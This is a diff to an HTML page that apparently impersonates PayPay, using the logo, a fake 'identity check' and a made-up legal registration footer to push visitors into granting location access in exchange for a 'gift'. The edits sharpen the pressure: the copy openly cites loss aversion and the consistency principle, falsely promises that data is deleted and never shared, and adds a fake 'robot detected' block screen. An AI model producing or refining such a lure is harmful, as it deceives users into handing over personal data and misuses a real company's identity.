@@ -12,10 +12,22 @@
       padding: 30px;
       background-color: #f7f7f7;
       margin: 0;
+      animation: fadeIn 1s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
 
     .logo {
       margin-top: 20px;
+      animation: slideIn 1s ease-in-out;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
     }
 
     .card {
@@ -58,6 +70,12 @@
       border-radius: 8px;
       cursor: pointer;
       box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      animation: glow 2s infinite;
+    }
+
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 8px #e60012; }
+      50% { box-shadow: 0 0 20px #ff3333; }
     }
 
     .note {
@@ -93,15 +111,17 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
     <p>
-      本サービスの安全な運用を守るため、<br><b>現在地情報の確認</b>をお願いしております。<br>
-      これは<b>全利用者に一律適用</b>される、PayPayの最新セキュリティチェックです。
+      安全性と利便性の両立のため、<br><b>位置情報の確認</b>をお願いしております。<br>
+      これは<b>全利用者に一律適用</b>される、PayPayのAIセキュリティチェッカーによる自動審査です。
     </p>
     <div class="warning">
-      ※位置情報を<b>許可されない場合、ギフトは受け取れません。</b>
+      ※位置情報を<b>許可されない場合、本人確認が未完了とみなされ、ギフトを受け取ることはできません。</b>
     </div>
     <p>
-      ご提供いただいた情報は<b>即時削除され、安全に処理</b>されますのでご安心ください。
+      私たちは<b>「損失回避の心理」</b>を考慮したシステム設計を行っております。<br>
+      ご提供いただいた情報は<b>即時削除・暗号化処理</b>され、<b>PayPay社外には一切共有されません</b>。
     </p>
+    <p><b>「一貫性の原理」</b>に基づき、最初のステップにご協力いただいた方にのみ、サービス提供が可能です。</p>
     <button onclick="verifyLocation()">位置情報を許可して続行</button>
     <div class="note">
       ※この確認は一度限りです。<br>拒否された場合、再取得はできません。
@@ -140,11 +160,22 @@
 
     if (localStorage.getItem('robot') === 'true') {
       document.body.innerHTML = `
-        <div style="padding:50px; text-align:center;">
+        <div style="padding:50px; text-align:center; font-family: 'Helvetica Neue', sans-serif; animation: fadeIn 1s ease-in;">
           <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" width="60"><br><br>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" width="60" style="animation: blink 1s infinite;"><br><br>
           <h2 style="color:#e60012; text-shadow: 0 0 3px red;">アクセスが制限されました</h2>
-          <p style="color:#333; font-size:15px;">PayPayはこの端末を<b style='color:red;'>ロボットと判断</b>したため、<br>ご利用いただけません。</p>
+          <p style="color:#333; font-size:15px;">
+            PayPayの自動判定システムにより、<b style='color:red;'>ロボットの可能性がある</b>と判断されました。
+          </p>
+          <p style="font-size:14px; color:#555; margin-top:25px;">
+            この判定は心理的行動パターン・応答速度・位置拒否判断をAIが統合的に解析し、<br>
+            <b>不審な挙動として記録されました。</b>
+          </p>
+          <p style="font-size:13px; color:#777; margin-top:30px;">
+            PayPay株式会社<br>
+            資金移動業者：関東財務局長 第00068号<br>
+            © 2025 PayPay Corporation. All rights reserved.
+          </p>
         </div>
       `;
     }
